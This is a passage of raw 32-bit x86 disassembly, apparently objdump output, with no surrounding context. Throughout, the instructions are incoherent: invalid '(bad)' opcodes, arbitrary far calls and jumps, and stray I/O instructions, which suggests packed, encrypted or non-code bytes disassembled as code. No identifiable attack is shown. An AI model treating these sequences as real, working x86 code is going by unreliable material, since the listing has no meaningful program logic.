  410d90:	jmp    0x48ea0e69
  410d95:	std    
  410d96:	imul   edx,DWORD PTR [esi+0x2b],0xdfbe4c74
  410d9d:	outs   dx,BYTE PTR ds:[esi]
  410d9e:	je     0x410d3c
  410da0:	push   eax
  410da1:	dec    esp
  410da2:	push   0x480d8256
  410da7:	(bad)  
  410da8:	jmp    0x410d3e
  410daa:	adc    DWORD PTR [ebx],0xd4eadeb1
  410db0:	or     eax,0xad762100
  410db5:	jmp    0xdf590e5c
  410dba:	or     al,0x44
  410dbc:	fstp   DWORD PTR [edx]
  410dbe:	pop    esi
  410dbf:	or     ebp,DWORD PTR [esi]
  410dc1:	mov    bh,0xb8
  410dc3:	sar    DWORD PTR [edi-0x8],0xbd
  410dc7:	(bad)  [ebp-0x48ea203]
  410dcd:	mov    cl,BYTE PTR ds:0x7b4d0415
  410dd3:	lds    ecx,FWORD PTR [edx+0x7a]
  410dd6:	loop   0x410da8
  410dd8:	inc    ecx
  410dd9:	push   ss
  410dda:	icebp  
  410ddb:	mul    BYTE PTR [ecx+0x5c]
  410dde:	call   0x6d1d2886
  410de3:	pusha  
  410de4:	add    BYTE PTR [ebp+0x5d],ch
  410de7:	sub    edx,DWORD PTR [ecx]
  410de9:	sar    DWORD PTR [ebx-0x3c],cl
  410dec:	pop    ss
  410ded:	inc    esp
  410dee:	dec    eax
  410def:	ror    eax,0x9d
  410df2:	sub    bl,0x21
  410df5:	arpl   WORD PTR [ecx+0x3e],ax
  410df8:	call   0x7e6711a
  410dfd:	rol    ah,1
  410dff:	(bad)  [ebx-0x26329c5]
  410e05:	add    dl,bh
  410e07:	jecxz  0x410e16
  410e09:	pop    ss
  410e0a:	not    BYTE PTR [edi-0x24]
  410e0d:	sar    BYTE PTR [edx+0x66],1
  410e10:	ret    
  410e11:	sbb    edx,DWORD PTR [ebp+0x62755217]
  410e17:	inc    esi
  410e18:	neg    DWORD PTR [esi+esi*2]
  410e1b:	pop    es
  410e1c:	sbb    dh,ah
  410e1e:	dec    ebp
  410e1f:	dec    ebx
  410e20:	mov    dh,0x75
  410e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e23:	adc    BYTE PTR [esi+edx*8+0x7fc5b141],bh
  410e2a:	xor    ebp,DWORD PTR [eax-0x1adba8ce]
  410e30:	or     dh,BYTE PTR [ecx]
  410e32:	call   0x391b655e
  410e37:	xor    al,0x98
  410e39:	sbb    al,0x9c
  410e3b:	pop    ecx
  410e3c:	scas   eax,DWORD PTR es:[edi]
  410e3d:	cs addr16 aas 
  410e40:	fisub  DWORD PTR [eax+eax*1+0x470b8a07]
  410e47:	push   edx
  410e48:	sub    bh,BYTE PTR [edx+0x7bb07efb]
  410e4e:	adc    dl,BYTE PTR fs:[ebx+0x671e7552]
  410e55:	push   0xffffffc9
  410e57:	stos   BYTE PTR es:[edi],al
  410e58:	pop    esi
  410e59:	mov    edx,0x417b541c
  410e5e:	mov    eax,0x61f61311
  410e63:	imul   BYTE PTR [ecx-0x70b6fe5f]
  410e69:	ins    BYTE PTR es:[edi],dx
  410e6a:	sbb    ah,BYTE PTR [eax]
  410e6c:	pop    ebx
  410e6d:	mov    edi,0xf7eb6460
  410e72:	xchg   ebx,eax
  410e73:	lods   al,BYTE PTR ds:[esi]
  410e74:	inc    edi
  410e75:	or     dh,0x7c
  410e78:	add    ecx,DWORD PTR [ebp+0x13]
  410e7b:	sbb    al,0xa8
  410e7d:	or     eax,0x23268015
  410e82:	jb     0x410e82
  410e84:	push   es
  410e85:	js     0x410e21
  410e87:	jl     0x410eb9
  410e89:	sub    BYTE PTR [eax+0x46],cl
  410e8c:	add    dh,BYTE PTR [edi+ebp*4]
  410e8f:	in     al,0x52
  410e91:	mov    ch,BYTE PTR [esi-0x516941bb]
  410e97:	lock lds ebx,FWORD PTR [ebp+0x5a693d7e]
  410e9e:	(bad)  
  410e9f:	pop    ecx
  410ea0:	mov    BYTE PTR [ebp-0x42],ah
  410ea3:	js     0x410efa
  410ea5:	scas   al,BYTE PTR es:[edi]
  410ea6:	mov    eax,0x8cfa5287
  410eab:	out    0xfd,eax
  410ead:	lods   al,BYTE PTR cs:[esi]
  410eaf:	pop    esp
  410eb0:	clc    
  410eb1:	jbe    0x410f1c
  410eb3:	mov    bl,0xb0
  410eb5:	fadd   QWORD PTR [edx+0x11eeb71c]
  410ebb:	es sub al,0x54
  410ebe:	pop    ecx
  410ebf:	sub    al,0x2a
  410ec1:	daa    
  410ec2:	push   esi
  410ec3:	inc    ebx
  410ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ec5:	sub    al,0xcc
  410ec7:	fs sub al,0xc3
  410eca:	xor    edi,DWORD PTR [ecx+ebp*2+0x55]
  410ece:	(bad)  
  410ecf:	ret    0x1d40
  410ed2:	cmc    
  410ed3:	sub    edx,DWORD PTR [ebx-0x7b]
  410ed6:	cld    
  410ed7:	dec    esi
  410ed8:	xchg   esi,eax
  410ed9:	and    dl,0xcd
  410edc:	repz mov esp,0xe0fac84e
  410ee2:	ds test eax,0xcb30bfca
  410ee8:	sbb    al,0x95
  410eea:	out    dx,al
  410eeb:	repnz aaa 
  410eed:	cwde   
  410eee:	xchg   ecx,eax
  410eef:	sub    cl,BYTE PTR [edi]
  410ef1:	inc    esp
  410ef2:	lock xchg edi,eax
  410ef4:	add    eax,0x75c7fdd3
  410ef9:	repz out 0x19,al
  410efc:	xchg   ah,ah
  410efe:	push   0x122b7cd3
  410f03:	test   bh,bl
  410f05:	pop    ds
  410f06:	les    edi,FWORD PTR [ebx]
  410f08:	push   cs
  410f09:	retf   0x4fd9
  410f0c:	in     eax,0xea
  410f0e:	pop    es
  410f0f:	sar    DWORD PTR [ebp-0x1fff9a9c],cl
  410f15:	adc    DWORD PTR [edi],edi
  410f17:	add    eax,DWORD PTR [edx+edi*1]
  410f1a:	push   ebx
  410f1b:	cmp    dh,BYTE PTR [edx+0x37]
  410f1e:	call   0xc38c:0x98fceb37
  410f25:	push   ds
  410f26:	cmp    ch,bl
  410f28:	(bad)  
  410f2a:	fmul   DWORD PTR [ebx]
  410f2c:	retf   0x3773
  410f2f:	repnz shl BYTE PTR ds:0x57959e9e,0x5
  410f37:	mov    al,0x5
  410f39:	sub    esi,ebx
  410f3b:	xchg   ecx,eax
  410f3c:	popf   
  410f3d:	adc    DWORD PTR [edi],0xf56ac0fe
  410f43:	cmp    eax,0x909051d8
  410f48:	sbb    eax,0x5a08c03d
  410f4d:	scas   al,BYTE PTR es:[edi]
  410f4e:	ret    0xdaaf
  410f51:	inc    ecx
  410f52:	je     0x410f0e
  410f54:	in     al,dx
  410f55:	cmp    BYTE PTR [esi-0x5ba9c35f],cl
  410f5b:	jle    0x410ee5
  410f5d:	jbe    0x410f39
  410f5f:	sub    BYTE PTR [ebx-0xf],dl
  410f62:	mov    bl,0x21
  410f64:	pop    ebx
  410f65:	loopne 0x410efa
  410f67:	push   eax
  410f68:	jmp    0xb620:0x53445ef5
  410f6f:	cs fld st(5)
  410f72:	adc    esi,DWORD PTR [ebx+0xc]
  410f75:	push   es
  410f76:	jnp    0x410f29
  410f78:	hlt    
  410f79:	sbb    al,0x9b
  410f7b:	sbb    ecx,0x39
  410f7e:	mov    DWORD PTR [edi+esi*8-0x1a],ecx
  410f82:	fldcw  WORD PTR [ebx+ebx*2-0x6fdfbc]
  410f89:	int    0x6c
  410f8b:	jle    0x410fa2
  410f8d:	test   ecx,edx
  410f8f:	push   es
  410f90:	imul   esp,DWORD PTR [eax],0x41
  410f93:	ins    DWORD PTR es:[edi],dx
  410f94:	and    edi,edi
  410f96:	xchg   ebp,eax
  410f97:	and    BYTE PTR ds:0x9bca2e06,dl
  410f9d:	mov    eax,0x597729b2
  410fa2:	adc    ebp,edx
  410fa4:	push   ds
  410fa5:	scas   al,BYTE PTR es:[edi]
  410fa6:	xchg   ebx,eax
  410fa7:	sar    BYTE PTR [edx+0x53280449],cl
  410fad:	mov    al,ds:0x8549ae7f
  410fb2:	or     edi,ebx
  410fb4:	loope  0x41101c
  410fb6:	lods   al,BYTE PTR ds:[esi]
  410fb7:	inc    ebp
  410fb8:	sbb    eax,0x8ae81c19
  410fbd:	and    DWORD PTR [eax-0x7457168b],eax
  410fc3:	push   0xffffffae
  410fc5:	lods   al,BYTE PTR ds:[esi]
  410fc6:	outs   dx,DWORD PTR ds:[esi]
  410fc7:	out    dx,eax
  410fc8:	mov    ds:0x397517be,al
  410fcd:	jecxz  0x411035
  410fcf:	scas   eax,DWORD PTR es:[edi]
  410fd0:	cdq    
  410fd1:	into   
  410fd2:	popa   
  410fd3:	call   FWORD PTR [esi+ebp*2+0x769195e7]
  410fda:	(bad)  
  410fdb:	test   edi,esi
  410fdd:	xchg   dh,dl
  410fdf:	adc    bh,ah
  410fe1:	jmp    0x4f284586
  410fe6:	rol    ah,0x41
  410fe9:	jge    0x410fc6
  410feb:	pop    DWORD PTR [edi-0x2b31215d]
  410ff1:	or     DWORD PTR [ecx-0x32],ecx
  410ff4:	jmp    0xa1447e1b
  410ff9:	and    BYTE PTR [ecx-0x71556f94],bl
  410fff:	lods   al,BYTE PTR ds:[esi]
  411000:	sub    dl,ah
  411002:	div    DWORD PTR [eax]
  411004:	clc    
  411005:	xor    bh,cl
  411007:	inc    edi
  411008:	mov    esp,0x142c6009
  41100d:	call   0xdc4b:0x737b1e4e
  411014:	mov    al,ds:0xd723cc02
  411019:	jae    0x41100e
  41101b:	mov    edx,0x4f4bb78c
  411020:	xchg   DWORD PTR [ecx-0x267b4225],eax
  411026:	arpl   WORD PTR gs:[esi],sp
  411029:	lock inc edx
  41102b:	scas   eax,DWORD PTR es:[edi]
  41102c:	jp     0x410fc5
  41102e:	call   FWORD PTR [edx-0x1d]
  411031:	pop    edx
  411032:	jle    0x41100d
  411034:	pop    ebp
  411035:	and    bh,BYTE PTR [edx]
  411037:	mov    eax,0x70ae2496
  41103c:	or     eax,0xd73e00a8
  411041:	xor    ah,0xca
  411044:	xor    bl,BYTE PTR [ebp-0x537a097a]
  41104a:	or     eax,0x1a8c4da3
  41104f:	test   eax,0xe61fd125
  411054:	(bad)  
  411055:	gs mov ah,0xfd
  411058:	pop    esi
  411059:	and    BYTE PTR [esi],0x54
  41105c:	dec    eax
  41105e:	and    eax,0xb96c2014
  411063:	jle    0x410fe8
  411065:	adc    bl,ah
  411067:	xchg   ebp,eax
  411068:	loop   0x411054
  41106a:	jne    0x411032
  41106c:	mov    esp,0x8bf71735
  411071:	mov    ebx,0x879101f0
  411076:	lahf   
  411077:	fdiv   QWORD PTR [eax+0x11cdeb6b]
  41107d:	popa   
  41107e:	test   eax,0xb4808cc1
  411083:	jne    0x41101e
  411085:	ds sti 
  411087:	inc    ebp
  411088:	push   0xffffff98
  41108a:	popf   
  41108b:	xchg   ebx,eax
  41108c:	mov    edi,DWORD PTR [edx-0x3f2e0183]
  411092:	call   0xa56d:0x193fcc01
  411099:	xchg   ecx,eax
  41109a:	stos   BYTE PTR es:[edi],al
  41109b:	icebp  
  41109c:	mov    eax,0xf356621b
  4110a1:	sub    ecx,DWORD PTR [ecx-0x42f51637]
  4110a7:	fdivrp st(2),st
  4110a9:	loope  0x4110c1
  4110ab:	outs   dx,BYTE PTR ds:[esi]
  4110ac:	data16 lock jnp 0x41104a
  4110b0:	mov    dh,0xd5
  4110b2:	or     BYTE PTR [ebp-0x4c],bl
  4110b5:	or     ebx,DWORD PTR [esi]
  4110b7:	mov    al,ds:0xb8058ba3
  4110bc:	fldenv [edi+0x2f]
  4110bf:	push   0xffffffb8
  4110c1:	leave  
  4110c2:	(bad)  
  4110c3:	pop    esp
  4110c4:	dec    ebx
  4110c5:	inc    ecx
  4110c6:	jecxz  0x411141
  4110c8:	iret   
  4110c9:	popa   
  4110ca:	or     al,0x95
  4110cc:	std    
  4110cd:	jnp    0x41112b
  4110cf:	mov    bh,0xd8
  4110d1:	std    
  4110d2:	test   eax,0xc575c21f
  4110d7:	jmp    0x59af6f13
  4110dc:	ss push 0xffffffc9
  4110df:	arpl   WORD PTR [ecx-0x61],bp
  4110e2:	addr16 mov ah,0x62
  4110e5:	adc    ecx,DWORD PTR [esi+0x646f40f6]
  4110eb:	js     0x4110cd
  4110ed:	mov    al,0xf
  4110ef:	in     eax,dx
  4110f0:	and    dh,BYTE PTR [ebx+0x5a037bba]
  4110f6:	in     eax,dx
  4110f7:	packssdw mm7,QWORD PTR [eax-0x11]
  4110fb:	and    edi,DWORD PTR [eax+0x31801036]
  411101:	stos   BYTE PTR es:[edi],al
  411102:	pop    ecx
  411103:	xchg   ebx,eax
  411104:	inc    eax
  411105:	ficomp DWORD PTR ds:0x26af755
  41110b:	adc    eax,0xfd3a3acd
  411110:	rcr    DWORD PTR [esi],1
  411112:	mov    ebx,0xca623479
  411117:	or     BYTE PTR [eax-0x4f],dl
  41111a:	hlt    
  41111b:	cmp    eax,0xc217ecd3
  411120:	mov    esi,0x11581a8f
  411125:	stc    
  411126:	call   0xbdd4:0x1a0eb434
  41112d:	jle    0x411112
  41112f:	mov    edx,0xc263343
  411134:	leave  
  411135:	addr16 push ss
  411137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411138:	or     dl,0x42
  41113b:	xor    BYTE PTR [edx],0x12
  41113e:	push   cs
  41113f:	adc    edi,DWORD PTR [esi+0x2b413f2c]
  411145:	mov    ebx,0xece2d849
  41114a:	and    al,BYTE PTR [esp+edx*8]
  41114d:	jle    0x4110fd
  41114f:	sub    DWORD PTR [eax+0xa0f4dad],esi
  411155:	mov    ds:0x3c7d0364,eax
  41115a:	sub    al,0x8d
  41115c:	in     al,dx
  41115d:	dec    ecx
  41115e:	and    DWORD PTR [ecx],edi
  411160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411161:	arpl   WORD PTR [esi],di
  411163:	adc    eax,0xbe5ad9d3
  411168:	mov    bl,0x63
  41116a:	jg     0x411182
  41116c:	(bad)  
  41116d:	(bad)  
  41116f:	dec    ebx
  411170:	sub    al,0x8d
  411172:	sub    cl,BYTE PTR [ebx+ebp*1+0x2affbed6]
  411179:	xor    DWORD PTR [ebp+0x35981771],esi
  41117f:	sar    esi,1
  411181:	aaa    
  411182:	jae    0x411144
  411184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411185:	out    dx,al
  411186:	sbb    al,0x20
  411188:	loopne 0x411120
  41118a:	cmp    BYTE PTR [ecx+0x9e73c9e],bh
  411190:	or     al,0x54
  411192:	cmp    ah,al
  411194:	int3   
  411195:	xor    BYTE PTR [esi-0x36],0x90
  411199:	pop    DWORD PTR ds:0x3d6543fa
  41119f:	mov    dh,0xf3
  4111a1:	sbb    eax,DWORD PTR [edx]
  4111a3:	dec    edi
  4111a4:	(bad)  
  4111a5:	in     eax,0xc4
  4111a7:	fld    QWORD PTR [eax+0x6a746e71]
  4111ad:	mov    edi,0x7efd4a1e
  4111b2:	ds cmp al,0x25
  4111b5:	and    DWORD PTR [edx+0x3a],ebx
  4111b8:	mov    ebx,0x9b9f4528
  4111be:	mov    esp,0x907460bd
  4111c3:	aam    0xca
  4111c5:	cmp    al,dh
  4111c7:	xor    eax,0x6f1de6c3
  4111cc:	inc    ebx
  4111cd:	inc    esp
  4111ce:	add    eax,0x1d703ef0
  4111d3:	lea    edx,[ecx+0x6f64eb9a]
  4111d9:	jge    0x4111a8
  4111db:	sbb    BYTE PTR [ecx-0x562d9b1],cl
  4111e1:	xor    DWORD PTR [ecx],edx
  4111e3:	pop    ds
  4111e4:	cmp    BYTE PTR [edx],dl
  4111e6:	pop    edi
  4111e7:	push   edi
  4111e8:	(bad)  
  4111e9:	repz aam 0x9e
  4111ec:	loope  0x4111ec
  4111ee:	cmp    eax,0x8f864d04
  4111f3:	mov    al,BYTE PTR [edx-0x6936de4]
  4111f9:	in     al,0xf5
  4111fb:	ficom  DWORD PTR ds:0xc12e28ad
  411201:	imul   eax,DWORD PTR [ebx],0xffffffce
  411204:	ins    BYTE PTR es:[edi],dx
  411205:	mov    ebp,0x603c2c82
  41120a:	xchg   ebp,eax
  41120b:	inc    edi
  41120c:	jg     0x4111f2
  41120e:	neg    BYTE PTR [edx-0x6eaf7841]
  411214:	add    ecx,DWORD PTR [edi+0x28c1888e]
  41121a:	aaa    
  41121b:	mov    bl,0x3e
  41121d:	dec    ebp
  41121e:	inc    esi
  41121f:	push   ebx
  411220:	loope  0x4111a8
  411222:	lods   eax,DWORD PTR ds:[esi]
  411223:	xor    edx,DWORD PTR [eax+0x6f8867de]
  411229:	jg     0x41126e
  41122b:	xor    ecx,DWORD PTR [ecx+eax*2-0x147fee5d]
  411232:	ror    DWORD PTR [esp+edx*4],1
  411235:	jp     0x411207
  411237:	or     BYTE PTR [ebx],dl
  411239:	push   eax
  41123a:	adc    DWORD PTR [edx-0x394de977],edx
  411240:	jmp    0x41125b
  411242:	iret   
  411243:	jmp    0x41126a
  411245:	push   ecx
  411246:	push   0x4df554a4
  41124b:	adc    DWORD PTR [eax-0x4bc8e2a0],esp
  411251:	repnz add eax,0x3edf0024
  411257:	mov    ds:0x3be0ccbc,eax
  41125c:	test   BYTE PTR [edx],cl
  41125e:	sahf   
  41125f:	fs dec esp
  411261:	pop    esp
  411262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411263:	xlat   BYTE PTR ds:[ebx]
  411264:	std    
  411265:	cmp    al,0x60
  411267:	in     al,dx
  411268:	fs sub eax,0x6b380467
  41126e:	and    cl,0xd5
  411271:	or     al,0x27
  411273:	popf   
  411274:	jno    0x41124c
  411276:	rol    DWORD PTR [edx],1
  411278:	sar    ah,cl
  41127a:	scas   eax,DWORD PTR es:[edi]
  41127b:	xchg   ebx,eax
  41127c:	pop    ebp
  41127d:	jnp    0x411273
  41127f:	(bad)  
  411280:	sti    
  411281:	dec    eax
  411282:	(bad)  
  411283:	mov    BYTE PTR [ebp-0x67],bl
  411286:	stc    
  411287:	adc    edi,ebx
  411289:	mov    fs,WORD PTR [eax+edx*1]
  41128c:	add    dh,BYTE PTR [eax]
  41128e:	inc    esi
  41128f:	mov    ch,0xb1
  411291:	in     eax,dx
  411292:	std    
  411293:	jae    0x41123e
  411295:	adc    al,0xe6
  411297:	or     BYTE PTR [ebx],ah
  411299:	pop    es
  41129a:	out    dx,eax
  41129b:	shl    BYTE PTR [edx],1
  41129d:	mov    edi,DWORD PTR [ebp-0xc]
  4112a0:	sbb    al,0xdc
  4112a2:	lahf   
  4112a3:	test   BYTE PTR [ebx-0x31],bl
  4112a6:	mov    ds:0xc1303faf,eax
  4112ab:	clc    
  4112ac:	inc    edx
  4112ad:	inc    ecx
  4112ae:	pop    edi
  4112af:	in     al,0xa2
  4112b1:	mov    ah,0xac
  4112b3:	fmul   st,st(6)
  4112b5:	add    eax,0xad92f995
  4112ba:	xor    al,0x35
  4112bc:	in     al,dx
  4112bd:	aam    0xbe
  4112bf:	mov    edi,0x2c92452c
  4112c4:	fs dec edx
  4112c6:	out    0x46,eax
  4112c8:	mov    dl,0xec
  4112ca:	in     eax,dx
  4112cb:	lds    eax,FWORD PTR [ebx+0x51ea3374]
  4112d1:	xchg   ebx,eax
  4112d2:	inc    BYTE PTR es:[edx+0x1e95ff61]
  4112d9:	scas   eax,DWORD PTR es:[edi]
  4112da:	repnz repnz iret 
  4112dd:	enter  0x97f9,0x2c
  4112e1:	in     eax,0xb1
  4112e3:	and    BYTE PTR [ebp+esi*1+0x3b54a195],bh
  4112ea:	jno    0x411309
  4112ec:	inc    DWORD PTR [esi+ebx*1-0x62]
  4112f0:	mov    ebx,0x58eda01f
  4112f5:	adc    eax,0x5061ec22
  4112fa:	shl    ah,cl
  4112fc:	add    al,0x6c
  4112fe:	sbb    cl,BYTE PTR ds:[ebx+0x33]
  411302:	int    0xd5
  411304:	test   al,0x3a
  411306:	cli    
  411307:	inc    ebx
  411308:	mov    dh,0x1
  41130a:	pop    ebp
  41130b:	sbb    DWORD PTR [edx-0x6c],eax
  41130e:	mov    al,0x98
  411310:	xor    edi,DWORD PTR [esi]
  411312:	out    0x1d,eax
  411314:	test   eax,0x7b0c1f07
  411319:	add    eax,0x80044b84
  41131e:	mov    ds:0x3f6ea716,al
  411323:	leave  
  411324:	mov    bl,0x3a
  411326:	popa   
  411327:	cmp    esi,DWORD PTR [edi]
  411329:	mov    al,0xc2
  41132b:	test   al,0xdf
  41132d:	outs   dx,BYTE PTR ds:[esi]
  41132e:	mov    fs,esp
  411330:	pop    ebp
  411331:	repnz fs adc al,0x49
  411335:	push   edi
  411336:	add    eax,0x171da92f
  41133b:	ins    DWORD PTR es:[edi],dx
  41133c:	std    
  41133d:	push   es
  41133e:	fadd   DWORD PTR ds:0xa3dc418a
  411344:	xor    DWORD PTR [eax],esp
  411346:	call   0x94a7:0x67478a3a
  41134d:	or     al,0x86
  41134f:	sub    DWORD PTR [edx+0x1e05f42c],ebx
  411355:	mov    eax,0xda069a94
  41135a:	sbb    BYTE PTR [eax-0x7d],0x9f
  41135e:	xor    BYTE PTR [ebp-0x50],al
  411361:	dec    ecx
  411362:	mov    dl,0x84
  411364:	fwait
  411365:	pop    es
  411366:	(bad)  
  411367:	jae    0x41135c
  411369:	pop    ebp
  41136a:	jns    0x411366
  41136c:	jnp    0x4113a8
  41136e:	test   al,0x7c
  411370:	and    eax,0xe4abc42f
  411375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411376:	sbb    al,0xd2
  411378:	imul   esi,esi,0x84e742a7
  41137e:	or     eax,0xd6018405
  411383:	pop    ss
  411384:	cmp    eax,0xf6c84e82
  411389:	fild   DWORD PTR [esi+eax*4+0x39c6a000]
  411390:	mov    ebp,0xa32eb0e7
  411395:	shr    DWORD PTR [edi-0x10],cl
  411398:	test   DWORD PTR [ebp+ecx*8-0x72],0xa69f6ee1
  4113a0:	xor    ebp,0xffffff83
  4113a3:	xor    ebp,DWORD PTR [eax+0x62db431f]
  4113a9:	jmp    0x3cb:0x724568ea
  4113b0:	shl    BYTE PTR [ecx],cl
  4113b2:	xor    al,0xb
  4113b4:	imul   edx,DWORD PTR [ecx],0x1c
  4113b7:	mov    bh,0xc3
  4113b9:	adc    BYTE PTR [edx-0x493923a2],dl
  4113bf:	mov    dl,0x3e
  4113c1:	cwde   
  4113c2:	imul   ebp,eax,0x46
  4113c5:	and    BYTE PTR [eax-0x60],0x82
  4113c9:	mov    dl,0xac
  4113cb:	inc    ecx
  4113cc:	test   DWORD PTR [edx],esi
  4113ce:	lods   eax,DWORD PTR ds:[esi]
  4113cf:	inc    edx
  4113d0:	das    
  4113d1:	cli    
  4113d2:	sub    DWORD PTR [ebx-0x73d7a561],ebp
  4113d8:	test   eax,0x325cf4a
  4113dd:	shr    DWORD PTR [eax-0x70],1
  4113e0:	push   eax
  4113e1:	lds    ebp,FWORD PTR [ebx]
  4113e3:	inc    eax
  4113e4:	push   ebx
  4113e5:	fcom   DWORD PTR [ecx-0x17]
  4113e8:	xor    dh,BYTE PTR [ebx-0x3b]
  4113eb:	fs and al,0x94
  4113ee:	push   esi
  4113ef:	xchg   BYTE PTR [ebx],dh
  4113f1:	jbe    0x411447
  4113f3:	out    dx,eax
  4113f4:	popa   
  4113f5:	add    DWORD PTR [edi-0x58661b28],esp
  4113fb:	retf   0xeeff
  4113fe:	sub    ebp,DWORD PTR [esp+eiz*8-0x65]
  411402:	and    eax,0x68e21c5
  411407:	jl     0x4113f0
  411409:	cvttps2pi mm2,QWORD PTR [edi]
  41140c:	leave  
  41140d:	adc    ah,BYTE PTR ss:[ebx]
  411410:	add    eax,0x40fe1c9a
  411415:	out    0x9d,al
  411417:	inc    edx
  411418:	xlat   BYTE PTR ds:[ebx]
  411419:	inc    edi
  41141a:	push   ebx
  41141b:	lock iret 
  41141d:	cmp    dh,BYTE PTR [ecx+0x1b]
  411420:	mov    edi,0x488dbbda
  411425:	inc    esi
  411426:	shr    DWORD PTR [edx],cl
  411428:	jl     0x411431
  41142a:	test   BYTE PTR [edi+0x18],bh
  41142d:	jnp    0x411408
  41142f:	aaa    
  411430:	add    ecx,DWORD PTR ds:[edi]
  411433:	ret    0x589b
  411436:	pop    ss
  411437:	jbe    0x4113ec
  411439:	in     eax,0xbc
  41143b:	cld    
  41143c:	pushf  
  41143d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41143e:	icebp  
  41143f:	cmp    al,0x29
  411441:	cmp    dl,BYTE PTR [esi-0x2]
  411444:	jmp    FWORD PTR [ebx+eiz*8-0xd859f4]
  41144b:	fnstenv [edx+0x66]
  41144e:	xchg   esp,eax
  41144f:	jo     0x411427
  411451:	sbb    al,0x2e
  411453:	mov    eax,0x4197ac28
  411458:	loopne 0x411469
  41145a:	jmp    0x99f7cbbc
  41145f:	ins    BYTE PTR es:[edi],dx
  411460:	inc    ebx
  411461:	mov    eax,DWORD PTR [edi]
  411463:	fsubr  st,st(3)
  411465:	nop
  411466:	push   eax
  411467:	out    0x9d,eax
  411469:	jp     0x4114cd
  41146b:	xor    edi,ebx
  41146d:	push   ebx
  41146e:	mov    ah,0xdf
  411470:	ficom  WORD PTR [edi]
  411472:	add    eax,0xc6b7e73e
  411477:	stos   DWORD PTR es:[edi],eax
  411478:	push   0xfa6323e5
  41147d:	test   DWORD PTR [esp+ecx*1],esp
  411480:	out    0x98,al
  411482:	adc    BYTE PTR [edx],bl
  411484:	sbb    dl,BYTE PTR [edx-0x394410b3]
  41148a:	call   0x24b4:0xdcc9ce4d
  411491:	adc    al,0xf6
  411493:	mov    dl,BYTE PTR [esi-0x75]
  411496:	(bad)  
  411498:	rcl    DWORD PTR [edx-0x4709eadb],cl
  41149e:	sbb    DWORD PTR [eax],ebx
  4114a0:	add    DWORD PTR [esp+ebx*8-0x6ac7831c],ebx
  4114a7:	inc    esp
  4114a8:	xchg   esp,eax
  4114a9:	push   0x961cf40b
  4114ae:	fimul  WORD PTR [edx+0xe]
  4114b1:	js     0x4114d8
  4114b3:	xor    DWORD PTR [ebp+0x72],ecx
  4114b6:	xchg   edi,eax
  4114b7:	xchg   BYTE PTR [esi-0x1e],ah
  4114ba:	dec    eax
  4114bb:	or     BYTE PTR ds:0x55dafcf1,ah
  4114c1:	add    BYTE PTR [ebx],dl
  4114c3:	jecxz  0x411459
  4114c5:	jle    0x41151b
  4114c7:	arpl   di,sp
  4114c9:	push   edi
  4114ca:	xor    DWORD PTR [ebx+0x1c5f7860],esi
  4114d0:	jae    0x4114b8
  4114d2:	lahf   
  4114d3:	cdq    
  4114d4:	pop    esi
  4114d5:	or     DWORD PTR [esi+0x27df4aaa],esp
  4114db:	push   0xdc66a89e
  4114e0:	inc    ecx
  4114e1:	xor    DWORD PTR [esi-0x15096091],edi
  4114e7:	pop    ss
  4114e8:	popf   
  4114e9:	jp     0x411499
  4114eb:	inc    edx
  4114ec:	std    
  4114ed:	lea    ecx,[edx]
  4114ef:	popf   
  4114f0:	pop    edx
  4114f1:	out    0x47,al
  4114f3:	leave  
  4114f4:	sti    
  4114f5:	sbb    ecx,0xfffffff1
  4114f8:	(bad)  
  4114f9:	in     al,dx
  4114fa:	fdiv   QWORD PTR [edx+0x74f6560b]
  411500:	add    bh,BYTE PTR [eax+0x34]
  411503:	mov    DWORD PTR [ebp-0x3f64df6b],esp
  411509:	mov    eax,ds:0x905ef426
  41150e:	jne    0x411500
  411510:	js     0x41157a
  411512:	mov    esp,0x9ddc9cf1
  411517:	xchg   BYTE PTR [ecx+edi*4-0x46],cl
  41151b:	cdq    
  41151c:	test   DWORD PTR [esi+0x19],edx
  41151f:	pop    ebx
  411520:	or     al,0xc0
  411522:	mov    ds:0xcea6930a,al
  411527:	adc    al,0x27
  411529:	adc    DWORD PTR [esi+0x398176ff],eax
  41152f:	pop    ebx
  411530:	xor    DWORD PTR [ebx+0x7fe3f83f],edi
  411536:	loop   0x411544
  411538:	ror    BYTE PTR [eax+0x2a4783bf],0x20
  41153f:	retf   0x8c02
  411542:	push   esi
  411543:	push   esp
  411544:	test   BYTE PTR [eax+0xe],bl
  411547:	push   ds
  411548:	push   0xdb1dfdb7
  41154d:	cmp    al,0x19
  41154f:	int    0xbb
  411551:	add    ebp,DWORD PTR [edx-0x66]
  411554:	push   eax
  411555:	(bad)  
  411556:	jp     0x411532
  411558:	xchg   al,dh
  41155a:	push   eax
  41155b:	out    dx,eax
  41155c:	fadd   DWORD PTR [edx]
  41155e:	xchg   BYTE PTR [ebx+0x77c72264],al
  411564:	mov    WORD PTR [edx+0x5ca38ee0],es
  41156a:	iret   
  41156b:	fistp  QWORD PTR [ebx-0x70e44b85]
  411571:	mov    ch,0x42
  411573:	out    dx,eax
  411574:	cld    
  411575:	fbld   TBYTE PTR [eax-0x67]
  411578:	inc    eax
  411579:	cdq    
  41157a:	mov    ebx,ebx
  41157c:	daa    
  41157d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41157e:	cdq    
  41157f:	mov    al,ds:0xc4f69d40
  411584:	xor    BYTE PTR [edx-0x11],ah
  411587:	jg     0x4115cd
  411589:	in     al,0x2e
  41158b:	cmp    ah,BYTE PTR [ebx]
  41158d:	les    edx,FWORD PTR [eax+0x66]
  411590:	jnp    0x411527
  411592:	inc    esp
  411593:	pop    ds
  411594:	xchg   esp,eax
  411595:	hlt    
  411596:	cwde   
  411597:	pop    esi
  411598:	cld    
  411599:	sub    DWORD PTR [ebp+0x44],0x19
  41159d:	repnz push es
  41159f:	jl     0x4115ef
  4115a1:	clc    
  4115a2:	in     al,0x38
  4115a4:	push   ebp
  4115a5:	push   esi
  4115a6:	sub    BYTE PTR [esi],bl
  4115a8:	or     edx,eax
  4115aa:	mov    ch,0x29
